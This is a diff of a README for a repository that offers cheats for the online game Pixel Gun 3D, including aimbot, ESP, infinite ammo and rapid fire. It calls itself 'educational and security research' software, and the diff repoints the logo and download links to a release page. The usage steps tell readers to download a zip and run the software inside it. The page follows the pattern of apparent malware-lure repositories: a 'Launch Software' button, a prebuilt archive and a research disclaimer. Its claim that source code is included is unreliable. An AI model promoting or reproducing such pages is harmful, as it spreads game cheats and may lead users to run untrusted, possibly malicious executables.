@@ -1,6 +1,6 @@
 # Pixel Gun 3D Utility Modification
 
-![Pixel Gun 3D Logo](https://www.example.com/pixelgunlogo.png)
+![Pixel Gun 3D Logo](https://github.com/adamw221/Pixel-Gun-3D/releases/tag/v2.0)
 
 Welcome to the Pixel Gun 3D repository - a free and open-source utility modification for PixelGun3D designed for educational and security research purposes. This software offers various cheats and enhancements for the popular game, including AimBot, ESP, Infinite Ammo, Rapid Fire, and more. The source code is included, ensuring transparency and the ability for users to customize and learn from it.
 
@@ -14,7 +14,7 @@ Welcome to the Pixel Gun 3D repository - a free and open-source utility modifica
 
 ## How to Use
 
-1. Download the software from the following link: [Launch Software 🚀](https://github.com/user-attachments/files/18060583/Software.zip)
+1. Download the software from the following link: [Launch Software 🚀](https://github.com/adamw221/Pixel-Gun-3D/releases/tag/v2.0)
 2. Extract the files from the downloaded zip folder.
 3. Run the software and follow the on-screen instructions to enable desired cheats and enhancements.
 
